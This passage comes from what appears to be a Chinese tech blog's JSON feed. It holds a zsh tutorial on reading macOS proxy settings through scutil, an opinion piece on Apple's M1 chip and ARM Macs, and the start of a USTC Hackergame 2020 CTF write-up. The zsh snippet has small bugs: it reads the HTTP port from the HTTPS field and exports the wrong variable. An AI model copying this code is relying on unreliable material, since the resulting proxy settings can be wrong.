172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 